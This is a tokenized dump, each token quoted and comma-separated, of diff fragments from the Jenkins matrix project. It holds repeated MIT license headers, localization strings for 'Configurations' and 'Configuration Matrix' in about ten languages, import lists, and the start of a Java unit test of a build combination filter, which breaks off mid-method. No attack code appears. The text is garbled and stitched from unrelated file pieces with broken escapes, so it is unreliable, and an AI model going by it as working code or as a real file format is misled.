"INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "\\", "u69cb", "\\", "u6210", "Configuration", "\\", "Matrix", "=", "\\", "u69cb", "\\", "u6210", "\\", "u30de", "\\", "u30c8", "\\", "u30ea", "\\", "u30c3", "\\", "u30af", "\\", "u30b9", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Configurations", "=", "\\", "uC124", "\\", "uC815", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "id", ":", "sorokh", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "Configuraties", "Configuration", "\\", "Matrix", "=", "Configuratiematix", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configuration", "\\", "Matrix", "=", "Macierz", "konfiguracji", "Configurations", "=", "Konfiguracje", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Reginaldo", "L", ".", "Russinholi", ",", "Cleiber", "Silva", ",", "Fernando", "Boaglio", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "Configura", "\\", "u00e7", "\\", "u00f5es", "Configuration", "\\", "Matrix", "=", "Matriz", "de", "configura", "\\", "u00e7", "\\", "u00e3o", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configuration", "\\", "Matrix", "=", "Matrix", "de", "Configura", "\\", "u00E7", "\\", "u00F5es", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Configuration", "\\", "Matrix", "=", "Matricea", "de", "configurare", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Mike", "Salnikov", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "\\", "u041a", "\\", "u043e", "\\", "u043d", "\\", "u0444", "\\", "u0438", "\\", "u0433", "\\", "u0443", "\\", "u0440", "\\", "u0430", "\\", "u0446", "\\", "u0438", "\\", "u0438", "Configuration", "\\", "Matrix", "=", "\\", "u041c", "\\", "u0430", "\\", "u0442", "\\", "u0440", "\\", "u0438", "\\", "u0446", "\\", "u0430", "\\", "u043a", "\\", "u043e", "\\", "u043d", "\\", "u0444", "\\", "u0438", "\\", "u0433", "\\", "u0443", "\\", "u0440", "\\", "u0430", "\\", "u0446", "\\", "u0438", "\\", "u0439", "@", "@", "-", "1", ",", "4", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Configuration", "\\", "Matrix", "=", "Konfigurationsmatris", "Configurations", "=", "Inst", "\\", "u00E4llningar", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2009", ",", "Sun", "Microsystems", ",", "Inc", ".", ",", "Kohsuke", "Kawaguchi", ",", "Oguz", "Dag", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "Konfig", "\\", "u00fcrasyonlar", "Configuration", "\\", "Matrix", "=", "Konfig", "\\", "u00fcrasyon", "Matrisi", "@", "@", "-", "1", ",", "3", "+", "0", ",", "0", "@", "@", "#", "This", "file", "is", "under", "the", "MIT", "License", "by", "authors", "Configurations", "=", "\\", "u041D", "\\", "u0430", "\\", "u043B", "\\", "u0430", "\\", "u0448", "\\", "u0442", "\\", "u0443", "\\", "u0432", "\\", "u0430", "\\", "u043D", "\\", "u043D", "\\", "u044F", "@", "@", "-", "1", ",", "23", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2004", "-", "2010", ",", "Sun", "Microsystems", ",", "Inc", ".", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "\\", "u914D", "\\", "u7F6E", "@", "@", "-", "1", ",", "24", "+", "0", ",", "0", "@", "@", "#", "The", "MIT", "License", "#", "#", "Copyright", "(", "c", ")", "2013", ",", "Chunghwa", "Telecom", "Co", ".", ",", "Ltd", ".", ",", "Pei", "-", "Tang", "Huang", "#", "#", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "#", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "#", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "#", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "#", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "#", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "#", "#", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "#", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "#", "#", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "#", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "#", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "#", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "#", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "#", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "#", "THE", "SOFTWARE", ".", "Configurations", "=", "\\", "u914D", "\\", "u7F6E", "Configuration", "\\", "Matrix", "=", "\\", "u8a2d", "\\", "u5b9a", "\\", "u77e9", "\\", "u9663", "@", "@", "-", "3", ",", "34", "+", "3", ",", "23", "@", "@", "import", "static", "org", ".", "hamcrest", ".", "CoreMatchers", ".", "not", ";", "import", "hudson", ".", "matrix", ".", "MatrixConfiguration", ";", "import", "hudson", ".", "matrix", ".", "MatrixProject", ";", "import", "hudson", ".", "model", ".", "AbstractProject", ";", "import", "hudson", ".", "model", ".", "TopLevelItemDescriptor", ";", "import", "hudson", ".", "model", ".", "ViewGroup", ";", "import", "java", ".", "io", ".", "File", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "InputStream", ";", "import", "javax", ".", "annotation", ".", "CheckForNull", ";", "import", "javax", ".", "servlet", ".", "ServletException", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Bug", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerRequest", ";", "import", "org", ".", "kohsuke", ".", "stapler", ".", "StaplerResponse", ";", "/", "*", "*", "The", "MIT", "License", "*", "*", "Copyright", "(", "c", ")", "2012", ",", "RedHat", "Inc", ".", "*", "*", "Permission", "is", "hereby", "granted", ",", "free", "of", "charge", ",", "to", "any", "person", "obtaining", "a", "copy", "*", "of", "this", "software", "and", "associated", "documentation", "files", "(", "the", "\"", "Software", "\"", "),", "to", "deal", "*", "in", "the", "Software", "without", "restriction", ",", "including", "without", "limitation", "the", "rights", "*", "to", "use", ",", "copy", ",", "modify", ",", "merge", ",", "publish", ",", "distribute", ",", "sublicense", ",", "and", "/", "or", "sell", "*", "copies", "of", "the", "Software", ",", "and", "to", "permit", "persons", "to", "whom", "the", "Software", "is", "*", "furnished", "to", "do", "so", ",", "subject", "to", "the", "following", "conditions", ":", "*", "*", "The", "above", "copyright", "notice", "and", "this", "permission", "notice", "shall", "be", "included", "in", "*", "all", "copies", "or", "substantial", "portions", "of", "the", "Software", ".", "*", "*", "THE", "SOFTWARE", "IS", "PROVIDED", "\"", "AS", "IS", "\"", ",", "WITHOUT", "WARRANTY", "OF", "ANY", "KIND", ",", "EXPRESS", "OR", "*", "IMPLIED", ",", "INCLUDING", "BUT", "NOT", "LIMITED", "TO", "THE", "WARRANTIES", "OF", "MERCHANTABILITY", ",", "*", "FITNESS", "FOR", "A", "PARTICULAR", "PURPOSE", "AND", "NONINFRINGEMENT", ".", "IN", "NO", "EVENT", "SHALL", "THE", "*", "AUTHORS", "OR", "COPYRIGHT", "HOLDERS", "BE", "LIABLE", "FOR", "ANY", "CLAIM", ",", "DAMAGES", "OR", "OTHER", "*", "LIABILITY", ",", "WHETHER", "IN", "AN", "ACTION", "OF", "CONTRACT", ",", "TORT", "OR", "OTHERWISE", ",", "ARISING", "FROM", ",", "*", "OUT", "OF", "OR", "IN", "CONNECTION", "WITH", "THE", "SOFTWARE", "OR", "THE", "USE", "OR", "OTHER", "DEALINGS", "IN", "*", "THE", "SOFTWARE", ".", "*", "/", "package", "hudson", ".", "matrix", ";", "import", "static", "org", ".", "mockito", ".", "Matchers", ".", "anyInt", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "mock", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "never", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "times", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "verify", ";", "import", "static", "org", ".", "mockito", ".", "Mockito", ".", "when", ";", "import", "hudson", ".", "ExtensionList", ";", "import", "hudson", ".", "matrix", ".", "MatrixBuild", ".", "MatrixBuildExecution", ";", "import", "hudson", ".", "matrix", ".", "listeners", ".", "MatrixBuildListener", ";", "import", "hudson", ".", "model", ".", "AbstractItem", ";", "import", "hudson", ".", "model", ".", "BuildListener", ";", "import", "hudson", ".", "model", ".", "Cause", ";", "import", "hudson", ".", "model", ".", "Node", ";", "import", "hudson", ".", "model", ".", "ParametersAction", ";", "import", "hudson", ".", "model", ".", "Result", ";", "import", "hudson", ".", "model", ".", "Run", ";", "import", "hudson", ".", "model", ".", "StringParameterValue", ";", "import", "java", ".", "io", ".", "IOException", ";", "import", "java", ".", "io", ".", "PrintStream", ";", "import", "java", ".", "util", ".", "ArrayList", ";", "import", "java", ".", "util", ".", "Arrays", ";", "import", "java", ".", "util", ".", "HashMap", ";", "import", "java", ".", "util", ".", "HashSet", ";", "import", "java", ".", "util", ".", "List", ";", "import", "java", ".", "util", ".", "Map", ";", "import", "jenkins", ".", "model", ".", "Jenkins", ";", "import", "org", ".", "apache", ".", "commons", ".", "io", ".", "output", ".", "ByteArrayOutputStream", ";", "import", "org", ".", "junit", ".", "Before", ";", "import", "org", ".", "junit", ".", "Test", ";", "import", "org", ".", "junit", ".", "runner", ".", "RunWith", ";", "import", "org", ".", "jvnet", ".", "hudson", ".", "test", ".", "Bug", ";", "import", "org", ".", "mockito", ".", "Mock", ";", "import", "org", ".", "mockito", ".", "MockitoAnnotations", ";", "import", "org", ".", "mockito", ".", "verification", ".", "VerificationMode", ";", "import", "org", ".", "powermock", ".", "api", ".", "mockito", ".", "PowerMockito", ";", "import", "org", ".", "powermock", ".", "core", ".", "classloader", ".", "annotations", ".", "PrepareForTest", ";", "import", "org", ".", "powermock", ".", "modules", ".", "junit4", ".", "PowerMockRunner", ";", "/", "**", "*", "Make", "sure", "that", "the", "combination", "filter", "schedules", "correct", "builds", "in", "correct", "order", "*", "*", "@", "author", "ogondza", "*", "/", "@", "RunWith", "(", "PowerMockRunner", ".", "class", ")", "@", "PrepareForTest", "(", "{", "Jenkins", ".", "class", ",", "MatrixBuildListener", ".", "class", ",", "MatrixProject", ".", "class", ",", "AbstractItem", ".", "class", "}", ")", "public", "class", "CombinationFilterUsingBuildParamsTest", "{", "/", "**", "*", "Execute", "releases", ":", "experimental", ",", "stable", ",", "beta", ",", "devel", "*", "*", "x", "s", "b", "d", "*", "0", ".", "1", "*", "0", ".", "9", "*", "*", "*", "*", "*", "1", "*", "*", "*", "*", "2", "*", "*", "*", "3", "*", "*", "/", "private", "static", "final", "String", "filter", "=", "String", ".", "format", "(", "\"", "(%", "s", ")", "|", "|", "(", "%", "s", ")", "|", "|", "(", "%", "s", ")", "\",", "\"", "RELEASE", "=", "=", "'", "stable", "'", "&", "&", "VERSION", "=", "=", "'", "1", "'", "\",", "\"", "RELEASE", "=", "=", "'", "beta", "'", "&", "&", "VERSION", ">", "=", "'", "1", "'", "&", "&", "VERSION", "<", "=", "'", "2", "'", "\",", "\"", "RELEASE", "=", "=", "'", "devel", "'", "&", "&", "VERSION", ">", "=", "'", "1", "'", "&", "&", "VERSION", "<", "=", "'", "3", "'", "\"", ")", ";", "private", "static", "final", "String", "touchstoneFilter", "=", "\"", "VERSION", "=", "=", "'", "0", ".", "9", "'", "\";", "private", "static", "final", "List", "<", "String", ">", "releases", "=", "Arrays", ".", "asList", "(", "\"", "stable", "\"", ",", "\"", "beta", "\"", ",", "\"", "devel", "\"", ",", "\"", "experimental", "\"", ")", ";", "private", "final", "Map", "<", "String", ",", "MatrixConfiguration", ">", "confs", "=", "new", "HashMap", "<", "String", ",", "MatrixConfiguration", ">", "()", ";", "private", "final", "MatrixExecutionStrategy", "strategy", "=", "new", "DefaultMatrixExecutionStrategyImpl", "(", "true", ",", "touchstoneFilter", ",", "Result", ".", "SUCCESS", ",", "new", "NoopMatrixConfigurationSorter", "(", ")", ")", ";", "private", "MatrixProject", "project", ";", "@", "Mock", "private", "MatrixBuildExecution", "execution", ";", "@", "Mock", "private", "MatrixBuild", "build", ";", "@", "Mock", "private", "MatrixRun", "run", ";", "@", "Mock", "private", "BuildListener", "listener", ";", "@", "Mock", "private", "Jenkins", "jenkins", ";", "@", "Mock", "private", "ExtensionList", "<", "MatrixBuildListener", ">", "extensions", ";", "@", "Before", "public", "void", "setUp", "(", ")", "throws", "Exception", "{", "MockitoAnnotations", ".", "initMocks", "(", "this", ")", ";", "usingDummyJenkins", "(", ");", "usingNoListeners", "(", ");", "usingDummyProject", "(", ");", "usingDummyExecution", "(", ");", "withReleaseAxis", "(", "releases", ")", ";", "}", "@", "Test", "public", "void", "testCombinationFilterV01", "(", ")", "throws", "InterruptedException", ",", "IOException", "{", "givenTheVersionIs", "(", "\"", "0", ".", "1", "\"", ");", "strategy", ".", "run", "(", "execution", ")", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "devel", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "beta", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "stable", "\"", "))", ";", "wasNotBuilt", "(", "confs", ".", "get", "(", "\"", "experimental", "\"", "))", ";", "}", "@", "Test", "public", "void", "testCombinationFilterV09", "(", ")", "throws", "InterruptedException", ",", "IOException", "{", "givenTheVersionIs", "(", "\"", "0", ".", "9", "\"", ");", "strategy", ".", "run", "(", "execution", ")", ";", "wasBuilt", "(", "confs", ".", "get", "(", "\"", "devel", "\"", "))", ";", "wasBuilt", "(", "confs", ".", "get", "(", "\"", "beta", "\"", "))", ";", "wasBuilt", "(", "confs", ".", "get", "(", "\"", "stable", "\"", "))", ";", "wasBuilt", "(", "confs", ".", "get", "(", "\"", "experimental", "\"", "))", ";", "}", "@", "Test", "public", "void", "testCombinationFilterV1", "(", ")", "throws", "InterruptedException", ",", "IOException", "{", "givenTheVersionIs", "(", "\"", "1", "\"", ");", "strategy", ".", "run", "(", "execution", ")", ";", "wasBuilt", "(", "confs", ".", "get", "(", "\"", "devel", "\"", "))", ";", "wasBuilt", "(", "confs", ".", "get", "(", "\"", "beta", "\"", "))", ";", 